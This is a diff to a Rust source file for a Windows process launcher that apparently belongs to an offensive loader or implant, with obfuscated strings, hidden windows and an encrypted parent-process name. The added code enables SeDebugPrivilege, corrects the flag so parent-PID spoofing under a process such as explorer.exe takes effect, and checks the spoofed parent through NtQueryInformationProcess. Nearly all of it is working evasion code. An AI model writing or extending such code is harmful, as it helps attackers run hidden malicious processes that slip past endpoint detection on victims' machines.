@@ -1,10 +1,11 @@
 #![allow(non_snake_case, dead_code, unused_variables, unused_imports, non_camel_case_types)]
 use crate::api;
 use obfstr::obfstr;
-use windows_sys::Win32::System::Threading::{STARTUPINFOEXW, InitializeProcThreadAttributeList, UpdateProcThreadAttribute, DeleteProcThreadAttributeList, CreateProcessW, OpenProcess, PROCESS_INFORMATION, PROCESS_ALL_ACCESS};
+use windows_sys::Win32::System::Threading::{STARTUPINFOEXW, InitializeProcThreadAttributeList, UpdateProcThreadAttribute, DeleteProcThreadAttributeList, CreateProcessW, OpenProcess, PROCESS_INFORMATION, PROCESS_ALL_ACCESS, GetCurrentProcess, OpenProcessToken, EXTENDED_STARTUPINFO_PRESENT};
 use windows_sys::Win32::Foundation::{CloseHandle, HANDLE, GetLastError, FALSE};
 use windows_sys::Win32::UI::WindowsAndMessaging::SW_HIDE;
 use windows_sys::Win32::System::Threading::STARTF_USESHOWWINDOW;
+use windows_sys::Win32::Security::{LookupPrivilegeValueW, AdjustTokenPrivileges, TOKEN_PRIVILEGES, SE_PRIVILEGE_ENABLED, TOKEN_ADJUST_PRIVILEGES, TOKEN_QUERY};
 use std::env;
 
 const PROC_THREAD_ATTRIBUTE_PARENT_PROCESS: usize = 0x00020000;
@@ -228,6 +229,37 @@ pub unsafe fn create_process(target_program: &str, creation_flags: u32) -> Resul
     // Attempt to spoof PPID with explorer.exe
     #[cfg(feature = "ppid_spoofing")]
     {
+        // Enable SeDebugPrivilege
+        unsafe {
+            let mut token: HANDLE = 0;
+            if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &mut token) != 0 {
+                let mut luid = std::mem::zeroed();
+                let priv_name: Vec<u16> = std::ffi::OsStr::new("SeDebugPrivilege").encode_wide().chain(std::iter::once(0)).collect();
+                if LookupPrivilegeValueW(std::ptr::null(), priv_name.as_ptr(), &mut luid) != 0 {
+                    let mut tp = TOKEN_PRIVILEGES {
+                        PrivilegeCount: 1,
+                        Privileges: [std::mem::zeroed(); 1],
+                    };
+                    tp.Privileges[0].Luid = luid;
+                    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+                    if AdjustTokenPrivileges(token, 0, &tp, 0, std::ptr::null_mut(), std::ptr::null_mut()) != 0 {
+                        #[cfg(feature = "debug")]
+                        crate::utils::print_message("SeDebugPrivilege enabled successfully");
+                    } else {
+                        #[cfg(feature = "debug")]
+                        crate::utils::print_message(&format!("Failed to enable SeDebugPrivilege: {}", GetLastError()));
+                    }
+                } else {
+                    #[cfg(feature = "debug")]
+                    crate::utils::print_message(&format!("LookupPrivilegeValueW failed: {}", GetLastError()));
+                }
+                CloseHandle(token);
+            } else {
+                #[cfg(feature = "debug")]
+                crate::utils::print_message(&format!("OpenProcessToken failed: {}", GetLastError()));
+            }
+        }
+
         use crate::utils::simple_decrypt;
         let parent_name = simple_decrypt(env!("RSL_ENCRYPTED_PARENT_PROCESS_NAME"));
         if let Some(parent_pid) = get_process_id_by_name(&parent_name) {
@@ -276,7 +308,7 @@ pub unsafe fn create_process(target_program: &str, creation_flags: u32) -> Resul
                             std::ptr::null(),
                             std::ptr::null(),
                             0,
-                            creation_flags,
+                            creation_flags | EXTENDED_STARTUPINFO_PRESENT,
                             std::ptr::null(),
                             std::ptr::null(),
                             &startup_info.StartupInfo,
@@ -286,6 +318,44 @@ pub unsafe fn create_process(target_program: &str, creation_flags: u32) -> Resul
                         if success != FALSE {
                             #[cfg(feature = "debug")]
                             crate::utils::print_message("PPID spoofing successful");
+
+                            // Verify actual PPID
+                            #[cfg(feature = "debug")]
+                            {
+                                use core::ffi::c_void;
+                                let mut pbi = PROCESS_BASIC_INFORMATION {
+                                    exit_status: 0,
+                                    peb_base_address: 0,
+                                    affinity_mask: 0,
+                                    base_priority: 0,
+                                    unique_process_id: 0,
+                                    inherited_from_unique_process_id: 0,
+                                };
+                                let mut return_len: u32 = 0;
+                                let status = api::query_information_process(
+                                    process_info.hProcess as isize,
+                                    0u32, // ProcessBasicInformation
+                                    &mut pbi as *mut _ as *mut c_void,
+                                    std::mem::size_of::<PROCESS_BASIC_INFORMATION>() as u32,
+                                    &mut return_len
+                                );
+                                match status {
+                                    Ok(s) if s >= 0 => {
+                                        if pbi.inherited_from_unique_process_id as u32 == parent_pid {
+                                            crate::utils::print_message("PPID spoofing verified: actual PPID matches expected");
+                                        } else {
+                                            crate::utils::print_message(&format!("PPID spoofing failed: expected PPID {}, actual PPID {}", parent_pid, pbi.inherited_from_unique_process_id));
+                                        }
+                                    }
+                                    Ok(s) => {
+                                        crate::utils::print_message(&format!("NtQueryInformationProcess returned negative status: {:#x}", s));
+                                    }
+                                    Err(e) => {
+                                        crate::utils::print_message(&format!("Failed to query PPID: {}", e));
+                                    }
+                                }
+                            }
+
                             DeleteProcThreadAttributeList(attr_list_ptr);
                             CloseHandle(parent_handle);
                             return Ok(process_info);
